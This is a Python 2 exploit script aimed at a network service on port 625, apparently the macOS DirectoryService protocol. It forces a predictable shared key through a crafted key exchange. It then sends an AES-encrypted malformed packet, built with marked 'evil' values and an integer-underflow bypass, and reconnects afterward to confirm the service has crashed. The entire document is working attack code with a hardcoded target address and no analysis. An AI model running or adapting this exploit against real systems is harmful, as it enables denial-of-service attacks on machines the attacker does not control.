from Crypto.Cipher import AES
import socket
import struct
import time
 
def send_packet(sock, data):
    packet = ""
    packet += "DSPX"
    packet += struct.pack(">I", len(data))
    packet += data
    sock.send(packet)
 
 
def get_crypted_data(shared_key, data):
    cipher = AES.new(shared_key, AES.MODE_CBC, "\x00" * 16)
    crypted_data = cipher.encrypt(data)
    return crypted_data
 
 
def attack(ip, port):
    try:
        p = socket.socket()
        p.connect((ip, port))
    except Exception, e:
        print e
        return
    data = ""
    data += "DHN2"
    data += "\x00" * 63 + "\x02" # Key that generates a DERIVED KEY, identical to the one received.
    # Packet 1
    print ("\nSending my public key ...")
    send_packet(p, data)
    resp = p.recv(65536)
    # Key sent by server.
    key_sent = resp[8: len(resp) - 1]
    server_key = ""
    # Flip the number.
    for i in range(len(key_sent) - 1, -1, -1):
        server_key += key_sent[i]
    # String to (a huge) number conversion.
    big_number = ""
    for c in server_key:
        big_number += "%.2x" % ord(c)
    big_number = int(big_number, 16)
    prime = 2 ** 128
    # Obtaining the SHARED KEY (To be use for AES encryption).
    derived_key = pow(big_number, 1, prime)
    magic_number = derived_key
    derived_key_string = ""
    # Transform key into a string.
    while magic_number != 0:
        resto = magic_number % 256
        magic_number /= 256
        derived_key_string += struct.pack("B", resto)[0]
    print "shared key: %s" % repr(derived_key_string)
    # Handshake.
    print "Sending the Handshaking"
    data = "A" * 4 + ("\x0c" * 12)
    crypted_data = get_crypted_data(derived_key_string, data)
    send_packet(p, crypted_data)
    resp = p.recv(65536)
    data = ""
    data += "A" * 0x1b
    data += "\x02"
    data += struct.pack("<I", 0x10000000)       # Evil value.
    data += struct.pack("<I", 0x100)            # Value to be used by the last patched version.
    data += "A" * ( 0x34 - len(data) )
    data += struct.pack(">I", 0x1172 + 1)       # Operation code.
    data += struct.pack(">I", 0x99999999)
    data += struct.pack(">I", 0x80808080)
    data += struct.pack(">I", 0x81818181)
    data += struct.pack(">I", 0x66666666)
    data += "B" * (0xe0 - len(
        data))           # Bypass in previous Mac OSX versions ( Integer underflow -> ( ( 0xe0 + 0x10 ) - 0x100 )
    data += "\x00" * 16
    crypted_data = get_crypted_data(derived_key_string, data)
    # TRIGGER
    print ( "Sending the evil packet" )
    send_packet(p, crypted_data)
    p.settimeout(10)
    try:
        p.recv(65536)
    except Exception, e:
        print e
    p.close()
    try:
        print ( "\nwaiting 10 seconds for check ..." )
        time.sleep(10)
        p = socket.socket()
        p.settimeout(10)
        p.connect(( ip, port ))
    except Exception:
        print ( "\nThe attack was successful !\n" )
        return
    print ( "\nThe attack wasn't successful\n" )
    return
 
 
ip = "192.168.100.1"
port = 625
attack(ip, port)
